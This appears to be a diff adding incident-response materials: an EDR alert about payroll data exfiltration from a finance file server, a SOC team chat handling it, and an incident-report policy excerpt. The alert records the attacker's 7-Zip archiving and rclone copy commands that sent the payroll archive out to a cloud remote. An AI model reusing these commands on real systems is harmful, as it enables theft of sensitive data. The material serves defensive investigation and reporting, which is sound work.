@@ -1,0 +1,56 @@
+
+===== RAW EDR ALERT (copied from console, JSON) =====
+{
+  "alert_id": "edr-7f1c2e90-44a1-4c0b-9d2e-5b8a1f3c6d70",
+  "title": "Suspicious archive + exfiltration tool",
+  "severity": "high",
+  "status": "new",
+  "created_utc": "2026-03-14T10:05:12Z",
+  "device": {"name": "FS-02", "os": "Windows Server 2022", "domain": "NBU", "ip": "10.20.1.12",
+             "tags": ["finance", "tier1-asset"], "sensor_version": "7.14.18204.0"},
+  "user": {"name": "NBU\\mchen", "sid": "S-1-5-21-3623811015-3361044348-30300820-4312"},
+  "process_tree": [
+    {"pid": 4120, "name": "explorer.exe", "cmdline": "C:\\Windows\\explorer.exe"},
+    {"pid": 7348, "ppid": 4120, "name": "7z.exe",
+     "cmdline": "\"C:\\Program Files\\7-Zip\\7z.exe\" a -mx1 C:\\Users\\mchen\\AppData\\Local\\Temp\\payroll_Q1.7z \\\\FS-02\\Finance\\Payroll\\2026\\*"},
+    {"pid": 8812, "ppid": 4120, "name": "rclone.exe",
+     "cmdline": "C:\\Users\\mchen\\Downloads\\rclone.exe copy C:\\Users\\mchen\\AppData\\Local\\Temp\\payroll_Q1.7z remote:drop --transfers 8"}
+  ],
+  "network": [{"remote_ip": "203.0.113.45", "remote_port": 443, "bytes_out": 2469606195, "protocol": "https"}],
+  "mitre": ["T1560.001 Archive via Utility", "T1567.002 Exfiltration to Cloud Storage"],
+  "recommended_actions": ["Isolate device", "Disable user", "Collect forensic package"],
+  "tenant": "nbu-prod", "policy": "Servers-Default", "detection_source": "behavioral"
+}
+
+===== TEAM CHAT (#soc-incidents), 10:06-10:40 =====
+[10:06] L. Nguyen: high sev EDR on FS-02, rclone + 7z, looks bad
+[10:07] S. Patel: is that the finance file server?
+[10:08] L. Nguyen: yep
+[10:11] R. Okafor: taking it. pulling proxy + VPN logs
+[10:13] R. Okafor: mchen VPN from 198.51.100.23 at 09:07, that IP is a VPS in NL, mchen is in the office today per badge logs
+[10:14] D. Varga: declare it. I'll ping the CISO
+[10:16] R. Okafor: declared IR-2026-0314
+[10:17] S. Patel: found the phish, "Updated Q1 payroll schedule", 12 recipients in finance
+[10:19] R. Okafor: disabling mchen now, killing VPN session
+[10:22] L. Nguyen: mchen mailbox has an inbox rule "sync" forwarding everything to some external address, IMAP login at 08:42 from same IP
+[10:24] R. Okafor: FS-02 isolated
+[10:26] D. Varga: CISO aware. Legal wants a written report by Monday
+[10:31] S. Patel: rule removed, IP and phishing domain blocked
+[10:33] L. Nguyen: lunch order going in, anyone want anything?
+[10:34] S. Patel: burrito pls
+[10:40] R. Okafor: I'll write up the notes, somebody check the other 11 recipients
+
+===== INCIDENT RESPONSE POLICY 7.20 (EXCERPT) - Section 5: Incident Reports =====
+5.1 A written incident report must be produced for every incident rated Medium or higher within
+three (3) business days of the incident being declared. The report is owned by the incident handler
+and approved by the SOC manager.
+5.2 The report must be factual and must distinguish confirmed facts from assumptions. Times must be
+recorded in UTC. Personal data must be minimized: refer to users by account name rather than full
+name where possible.
+5.3 Reports involving Restricted data (for example financial account numbers, tax identifiers, or
+health information) must be shared with the Office of General Counsel and the Privacy Office, who
+determine whether regulatory or contractual breach-notification obligations apply.
+5.4 Reports are stored in the IR case management system and retained for seven (7) years.
+5.5 Lessons-learned items must be tracked as action items with an owner and due date.
+5.6 Templates are available on the SOC SharePoint site. Use of the template is recommended but not
+mandatory.
